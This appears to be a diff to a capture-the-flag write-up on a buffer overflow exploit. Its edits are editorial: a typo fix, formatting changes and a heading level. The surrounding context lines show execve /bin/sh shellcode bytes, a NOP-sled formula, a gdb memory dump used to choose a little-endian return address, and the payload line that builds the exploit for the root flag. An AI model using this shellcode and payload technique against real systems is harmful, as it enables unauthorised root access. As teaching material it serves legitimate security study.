@@ -556,10 +556,9 @@ buffsize = 362
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 ```
 
-Next we need to define the NOP-sled, brloe is a good explanation of what that is taken from [here](https://www.coengoedegebure.com/buffer-overflow-attacks-explained).
+Next we need to define the NOP-sled, below is a good explanation of what that is taken from [here](https://www.coengoedegebure.com/buffer-overflow-attacks-explained).
 
-**A NOP-sled is a sequence of NOP (no-operation) instructions meant to "slide" the CPU's instruction execution flow to the next memory address. Anywhere the return address lands in the NOP-sled, it's going to slide along the buffer until it hits the start of the shellcode. NOP-values may differ per CPU, but for the OS and CPU we're aiming at, the NOP-value is \x90.
-**
+A NOP-sled is a sequence of NOP (no-operation) instructions meant to "slide" the CPU's instruction execution flow to the next memory address. Anywhere the return address lands in the NOP-sled, it's going to slide along the buffer until it hits the start of the shellcode. NOP-values may differ per CPU, but for the OS and CPU we're aiming at, the NOP-value is \x90.
 
 The formula for the nopsled is "\x90"*(buffsize-len(shellcode)), let's put that in our script:
 
@@ -686,7 +685,7 @@ Now we move back 400 bytes with an offset of -400:
 0xbffff4f0:     0x61616161      0x61616161      0x61616161      0x61616161
 ```
 
-We don't have to be exact, just pick something within the range where we see our payload of 0x61616161. So for this we pick 0xbffff4c0, note that you have to reverse the order of the last 8 characters as this system uses little endian (explanation of Endianness [here](https://en.wikipedia.org/wiki/Endianness). This means **0x bf ff f4 co** becomes **c0 f4 ff bf 0x**, but we drop the last 0x. Also as with the shellcode we add \x in front of each group of two.
+We don't have to be exact, just pick something within the range where we see our payload of 0x61616161. So for this we pick 0xbffff4c0, note that you have to reverse the order of the last 8 characters as this system uses little endian (explanation of Endianness [here](https://en.wikipedia.org/wiki/Endianness). This means __0x bf ff f4 co__ becomes __c0 f4 ff bf 0x__, but we drop the last 0x. Also as with the shellcode we add \x in front of each group of two.
 
 Update our exploit:
 
@@ -858,7 +857,7 @@ payload = nopsled + shellcode + eip
 print payload
 ```
 
-### Root Flag
+## Root Flag
 
 Now run the binary using our script as the parameter:
 
